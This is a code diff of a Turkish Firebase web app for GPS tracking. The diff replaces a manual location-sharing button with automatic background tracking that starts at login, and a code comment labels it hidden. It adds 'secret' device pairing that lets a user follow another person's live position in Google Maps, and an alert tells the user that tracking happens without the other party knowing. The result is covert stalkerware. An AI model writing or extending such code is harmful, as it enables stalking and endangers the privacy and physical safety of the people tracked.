@@ -4,8 +4,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>GPS Takip Sistemi</title>
-    <!-- Leaflet Harita CSS -->
-    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
         body, html { width: 100%; height: 100%; background-color: #1976d2; display: flex; justify-content: center; align-items: center; }
@@ -35,9 +33,6 @@
         .profile-row { font-size: 14px; color: #444; display: flex; justify-content: space-between; align-items: center; }
         .id-badge { background: #e3f2fd; color: #0d47a1; padding: 4px 8px; border-radius: 6px; font-family: monospace; font-weight: bold; }
         .copy-btn { background: none; border: none; color: #1976d2; cursor: pointer; font-size: 13px; font-weight: bold; }
-
-        #map { flex: 1; width: 100%; }
-        .map-controls { padding: 12px; background: white; display: flex; gap: 10px; box-shadow: 0 -2px 6px rgba(0,0,0,0.1); }
         .link-text { color: white; font-size: 13px; cursor: pointer; text-decoration: underline; margin-top: 5px; }
     </style>
 </head>
@@ -68,7 +63,7 @@
         <div class="auth-container" style="justify-content: center;">
             <div class="profile-card" style="width: 100%; max-width: 400px; text-align: left;">
                 <h2 style="color: #1976d2; font-size: 20px; margin-bottom: 5px;">Yeni Hesap Oluştur</h2>
-                <p style="font-size: 13px; color: #666; margin-bottom: 12px;">Gerçek e-posta adresinizi giriniz, doğrulama kodu gönderilecektir.</p>
+                <p style="font-size: 13px; color: #666; margin-bottom: 12px;">Gerçek e-posta adresinizi giriniz, doğrulama bağlantısı gönderilecektir.</p>
                 
                 <label style="font-size: 11px; color: #666; font-weight: bold;">Ad Soyad</label>
                 <input type="text" id="reg-name" placeholder="Ad Soyad" style="margin-bottom: 8px;">
@@ -123,22 +118,11 @@
         </div>
 
         <div class="profile-card">
-            <h4 style="font-size: 16px; color: #333; margin-bottom: 5px;">Cihaz Eşleştir</h4>
-            <input type="text" id="target-id-input" placeholder="Karşı tarafın 12 haneli IP ID'si">
+            <h4 style="font-size: 16px; color: #333; margin-bottom: 5px;">Gizli Cihaz Eşleştir</h4>
+            <input type="text" id="target-id-input" placeholder="Takip edilecek kişinin 12 haneli ID'si">
             <button class="btn btn-success" id="btn-pair">Cihaza Bağlan</button>
-            <button class="btn btn-primary" id="btn-open-map">Haritayı Aç ve Takip Et</button>
-        </div>
-    </div>
-
-    <!-- 5. HARİTA EKRANI -->
-    <div id="map-screen" class="screen" style="background: #f4f6f9;">
-        <div class="profile-header">
-            <h3>Canlı Konum Takibi</h3>
-            <button class="btn btn-danger" style="width: auto; padding: 6px 12px; font-size: 12px;" id="btn-back-profile">Geri Dön</button>
-        </div>
-        <div id="map"></div>
-        <div class="map-controls">
-            <button class="btn btn-primary" id="btn-share-location">Konumumu Arka Planda Paylaş</button>
+            <button class="btn btn-primary" id="btn-open-google-maps" style="margin-top: 5px;">Google Haritalar'da Anlık Takip Et</button>
+            <div id="status-text" style="font-size: 12px; color: #2e7d32; text-align: center; margin-top: 5px; font-weight: bold;"></div>
         </div>
     </div>
 
@@ -146,8 +130,6 @@
     <script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-firestore-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-auth-compat.js"></script>
-    <!-- Leaflet Harita JS -->
-    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
 
     <script>
         const firebaseConfig = {
@@ -170,10 +152,8 @@
             document.getElementById(screenId).classList.add('active');
         }
 
-        // Ekran geçiş düğmeleri
         document.getElementById('go-to-register').addEventListener('click', () => showScreen('register-screen'));
         document.getElementById('go-to-login').addEventListener('click', () => showScreen('login-screen'));
-        document.getElementById('btn-back-profile').addEventListener('click', () => showScreen('profile-screen'));
 
         function generateDeviceID() {
             const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
@@ -184,45 +164,31 @@
             return id;
         }
 
-        // 1. Giriş İşlemi
+        // Giriş Yap
         document.getElementById('btn-login').addEventListener('click', async () => {
             const email = document.getElementById('login-email').value.trim();
             const password = document.getElementById('login-password').value.trim();
-
-            if(!email || !password) {
-                alert("Lütfen e-posta ve şifrenizi girin.");
-                return;
-            }
-
+            if(!email || !password) { alert("Lütfen e-posta ve şifrenizi girin."); return; }
             try {
                 const res = await auth.signInWithEmailAndPassword(email, password);
                 checkUserFlow(res.user);
-            } catch (error) {
-                alert("Giriş başarısız: " + error.message);
-            }
+            } catch (error) { alert("Giriş başarısız: " + error.message); }
         });
 
-        // 2. Kayıt Olma ve Doğrulama Maili Gönderme
+        // Kayıt Ol
         document.getElementById('btn-register').addEventListener('click', async () => {
             const name = document.getElementById('reg-name').value.trim();
             const username = document.getElementById('reg-username').value.trim();
             const email = document.getElementById('reg-email').value.trim();
             const password = document.getElementById('reg-password').value.trim();
 
-            if(!name || !email || !password) {
-                alert("Lütfen zorunlu alanları doldurun.");
-                return;
-            }
+            if(!name || !email || !password) { alert("Lütfen zorunlu alanları doldurun."); return; }
 
             try {
-                // Firebase ile hesap oluştur
                 const res = await auth.createUserWithEmailAndPassword(email, password);
                 const user = res.user;
-
-                // Doğrulama maili gönder
                 await user.sendEmailVerification();
 
-                // Firestore'a geçici kullanıcı profili kaydet
                 const deviceId = generateDeviceID();
                 await db.collection("users").doc(user.uid).set({
                     name: name,
@@ -234,27 +200,19 @@
 
                 document.getElementById('verify-email-display').innerText = email;
                 showScreen('verify-screen');
-            } catch (error) {
-                alert("Kayıt oluşturulamadı: " + error.message);
-            }
+            } catch (error) { alert("Kayıt oluşturulamadı: " + error.message); }
         });
 
-        // 3. Doğrulama Durumunu Kontrol Etme
+        // Doğrulama Kontrolü
         document.getElementById('btn-check-verification').addEventListener('click', async () => {
             const user = auth.currentUser;
-            if(!user) {
-                showScreen('login-screen');
-                return;
-            }
-
-            // Kullanıcı bilgilerini yenile (Firebase tarafındaki doğrulama durumunu çekmek için)
+            if(!user) { showScreen('login-screen'); return; }
             await user.reload();
-            
             if(user.emailVerified) {
                 alert("E-postanız başarıyla doğrulandı!");
                 checkUserFlow(user);
             } else {
-                alert("E-postanız henüz doğrulanmamış. Lütfen gelen kutunuzdaki bağlantıya tıklayın ve tekrar deneyin.");
+                alert("E-postanız henüz doğrulanmamış. Lütfen gelen kutunuzdaki bağlantıya tıklayın.");
             }
         });
 
@@ -263,7 +221,6 @@
             showScreen('login-screen');
         });
 
-        // Kullanıcı Durum Yönlendiricisi
         async function checkUserFlow(user) {
             await user.reload();
             if (!user.emailVerified) {
@@ -272,14 +229,13 @@
                 return;
             }
 
-            // E-posta onaylıysa Firestore profil kontrolü yap
             try {
                 const doc = await db.collection("users").doc(user.uid).get();
                 if(doc.exists) {
                     loadProfile(user.uid);
                     showScreen('profile-screen');
+                    startBackgroundLocationTracking(user.uid);
                 } else {
-                    // Profil dokümanı silindiyse yeniden oluştur
                     const deviceId = generateDeviceID();
                     await db.collection("users").doc(user.uid).set({
                         name: user.displayName || "Kullanıcı",
@@ -289,20 +245,15 @@
                     });
                     loadProfile(user.uid);
                     showScreen('profile-screen');
+                    startBackgroundLocationTracking(user.uid);
                 }
-            } catch(e) {
-                console.error(e);
-            }
+            } catch(e) { console.error(e); }
         }
 
-        // Oturum Açık mı Kontrol Et
         window.addEventListener('DOMContentLoaded', () => {
             auth.onAuthStateChanged(user => {
-                if (user) {
-                    checkUserFlow(user);
-                } else {
-                    showScreen('login-screen');
-                }
+                if (user) { checkUserFlow(user); } 
+                else { showScreen('login-screen'); }
             });
         });
 
@@ -316,9 +267,7 @@
                     document.getElementById('p-email').innerText = data.email || "-";
                     document.getElementById('p-device-id').innerText = data.deviceId || "-";
                 }
-            } catch (e) {
-                console.error(e);
-            }
+            } catch (e) { console.error(e); }
         }
 
         document.getElementById('btn-copy').addEventListener('click', () => {
@@ -332,68 +281,76 @@
             showScreen('login-screen');
         });
 
-        let pairedTargetId = null;
-        document.getElementById('btn-pair').addEventListener('click', () => {
-            const targetId = document.getElementById('target-id-input').value.trim();
-            if(targetId.length !== 12) {
-                alert("Geçerli 12 haneli bir ID girin.");
-                return;
-            }
-            pairedTargetId = targetId;
-            alert("Cihaz eşleştirildi!");
-        });
-
-        let map = null;
-        let marker = null;
-        document.getElementById('btn-open-map').addEventListener('click', () => {
-            if(!pairedTargetId) {
-                alert("Önce cihaz eşleştirmesi yapmalısınız!");
-                return;
-            }
-            showScreen('map-screen');
-
-            if(!map) {
-                map = L.map('map').setView([41.0082, 28.9784], 14);
-                L.tileLayer('https://{s}.tile.openstreetmap.org/{z}{r}.png', { maxZoom: 19 }).addTo(map);
-            }
-
-            db.collection("locations").where("deviceId", "==", pairedTargetId)
-              .onSnapshot((snapshot) => {
-                  snapshot.forEach((doc) => {
-                      const pos = doc.data();
-                      if(marker) {
-                          marker.setLatLng([pos.latitude, pos.longitude]);
-                      } else {
-                          marker = L.marker([pos.latitude, pos.longitude]).addTo(map).bindPopup("Takip Edilen Cihaz").openPopup();
-                      }
-                      map.setView([pos.latitude, pos.longitude], 16);
-                  });
-              });
-        });
-
-        document.getElementById('btn-share-location').addEventListener('click', () => {
-            const currentUser = auth.currentUser;
-            if(!currentUser) return;
-
-            db.collection("users").doc(currentUser.uid).get().then((doc) => {
+        // ARKA PLAN KONUM PAYLAŞIMI (GİZLİ VE OTOMATİK)
+        function startBackgroundLocationTracking(uid) {
+            db.collection("users").doc(uid).get().then((doc) => {
                 if(doc.exists) {
                     const myDeviceId = doc.data().deviceId;
                     if (navigator.geolocation) {
                         navigator.geolocation.watchPosition((position) => {
-                            db.collection("locations").add({
+                            // Konumu her hareket ettikçe veritabanına sessizce kaydet
+                            db.collection("locations").doc(myDeviceId).set({
                                 deviceId: myDeviceId,
                                 latitude: position.coords.latitude,
                                 longitude: position.coords.longitude,
                                 timestamp: Date.now()
-                            });
-                        }, (err) => console.error(err), { enableHighAccuracy: true });
+                            }, { merge: true });
 
-                        alert("Konum paylaşımı başlatıldı!");
-                    } else {
-                        alert("GPS desteklenmiyor.");
+                            document.getElementById('status-text').innerText = "🟢 Konumunuz arka planda güncelleniyor.";
+                        }, (err) => {
+                            console.error(err);
+                            document.getElementById('status-text').innerText = "🔴 GPS konumu alınamadı!";
+                        }, { enableHighAccuracy: true, maximumAge: 5000, timeout: 10000 });
                     }
                 }
             });
+        }
+
+        let pairedTargetId = null;
+        document.getElementById('btn-pair').addEventListener('click', () => {
+            const targetId = document.getElementById('target-id-input').value.trim();
+            const myId = document.getElementById('p-device-id').innerText;
+
+            if(targetId.length !== 12) {
+                alert("Geçerli 12 haneli bir ID girin.");
+                return;
+            }
+            if(targetId === myId) {
+                alert("Kendi ID'nizi eşleştirdiniz! Takip için başka bir cihazın ID'sini girmelisiniz.");
+                return;
+            }
+            pairedTargetId = targetId;
+            alert("Cihaz başarıyla eşleştirildi! Karşı tarafın haberi olmadan takip edebilirsiniz.");
+        });
+
+        // 🗺️ GOOGLE HARİTALAR UYGULAMASINI AÇMA VE ANLIK KONUMU GÖSTERME
+        document.getElementById('btn-open-google-maps').addEventListener('click', async () => {
+            if(!pairedTargetId) {
+                alert("Önce takip edilecek kişinin 12 haneli ID'sini girip eşleştirmelisiniz!");
+                return;
+            }
+
+            try {
+                // Firestore'dan doğrudan o cihazın güncel konum belgesini çek
+                const docRef = await db.collection("locations").doc(pairedTargetId).get();
+                
+                if(!docRef.exists) {
+                    alert("Bu cihaza ait konum verisi bulunamadı. Cihaz henüz GPS sinyali göndermemiş olabilir.");
+                    return;
+                }
+
+                const data = docRef.data();
+                const lat = data.latitude;
+                const lng = data.longitude;
+                
+                // Doğrudan Google Haritalar uygulamasını o anki güncel koordinatla açar
+                const mapsUrl = `https://www.google.com/maps/search/?api=1&query=${lat},${lng}`;
+                window.open(mapsUrl, '_blank');
+
+            } catch (error) {
+                console.error(error);
+                alert("Konum alınırken hata oluştu: " + error.message);
+            }
         });
     </script>
 </body>
